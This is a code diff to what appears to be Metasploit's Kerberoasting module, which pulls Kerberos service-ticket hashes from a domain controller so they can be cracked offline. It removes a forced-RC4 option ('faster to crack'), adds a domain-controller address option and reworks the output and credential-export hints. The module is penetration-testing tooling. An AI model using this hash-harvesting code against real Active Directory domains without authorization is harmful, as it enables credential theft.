@@ -42,8 +42,8 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
         OptString.new('TARGET_USER', [ false, 'Specific user to kerberoast' ]),
-        OptBool.new('USE_RC4_HMAC', [ true, 'Forcibly request RC4 etype instead of letting the DC decide based on KrbOfferedEncryptionTypes (RC4_HMAC is faster to crack)', true]),
         OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
+        Msf::OptAddress.new('DomainControllerRhost', [false, 'The resolvable rhost for the Domain Controller'], fallbacks: ['rhost']),
       ]
     )
     register_option_group(name: 'SESSION',
@@ -89,11 +89,7 @@ class MetasploitModule < Msf::Auxiliary
       jtr = roast(user, spn)
       jtr_format = Metasploit::Framework::Hashes.identify_hash(jtr)
       report_hash(jtr, jtr_format)
-      vprint_good("Success: \n#{jtr}")
-      unless datastore['VERBOSE']
-        print_good('To obtain the crackable values for this DC, run `creds`:')
-        print_good("creds -t #{jtr_format} -O #{datastore['RHOST']} -o <outfile.(jtr|hcat)>")
-      end
+      print_good("Success: \n#{jtr}")
     rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
       print_error("#{user} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
     end
@@ -115,11 +111,17 @@ class MetasploitModule < Msf::Auxiliary
         print_error("#{username} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
       end
     end
-    vprint_good("Success: \n#{hashes.join("\n")}")
-    unless datastore['VERBOSE']
-      print_good('To obtain the crackable values, run `creds`:')
+    if hashes.empty?
+      return
+    end
+
+    print_good("Success: \n#{hashes.join("\n")}")
+
+    if jtr_formats.length > 1
+      print_warning('NOTE: Multiple encryption types returned - will require separate cracking runs for each type.')
+      print_status('To obtain the crackable values for a praticular type, run `creds`:')
       jtr_formats.each do |format|
-        print_good("creds -t #{format} -O #{datastore['RHOST']} -o <outfile.(jtr|hcat)>")
+        print_status("creds -t #{format} -O #{datastore['RHOST']} -o <outfile.(jtr|hcat)>")
       end
     end
   end
@@ -141,7 +143,6 @@ class MetasploitModule < Msf::Auxiliary
       realm: domain_name,
       username: username,
       password: password,
-      offered_etypes: offered_etypes,
       framework: framework,
       framework_module: framework_module,
       ticket_storage: Msf::Exploit::Remote::Kerberos::Ticket::Storage::WriteOnly.new(framework: framework, framework_module: framework_module)
@@ -163,14 +164,6 @@ class MetasploitModule < Msf::Auxiliary
       value: credential.keyblock.data.value
     )
 
-    etypes = Set.new([credential.keyblock.enctype.value])
-    intersection = etypes.intersection(offered_etypes)
-    if intersection.empty?
-      names = etypes.map { |t| Rex::Proto::Kerberos::Crypto::Encryption.const_name(t).sub('_', '-') }.join(',')
-      print_warning("Unable to request ticket with configured etypes for #{roasted}. Supported: #{names}")
-      return nil
-    end
-
     tgs_options = {
       pa_data: []
     }
@@ -180,7 +173,7 @@ class MetasploitModule < Msf::Auxiliary
       ticket,
       domain_name.upcase,
       username,
-      intersection,
+      offered_etypes,
       expiry_time,
       now,
       sname,
@@ -217,11 +210,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def offered_etypes
-    if datastore['USE_RC4_HMAC']
-      [Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC]
-    else
-      Msf::Exploit::Remote::AuthOption.as_default_offered_etypes(datastore['LDAP::KrbOfferedEncryptionTypes'])
-    end
+    Msf::Exploit::Remote::AuthOption.as_default_offered_etypes(datastore['LDAP::KrbOfferedEncryptionTypes'])
   end
 
   attr_accessor :ldap_query # The LDAP query for this module, loaded from a yaml file
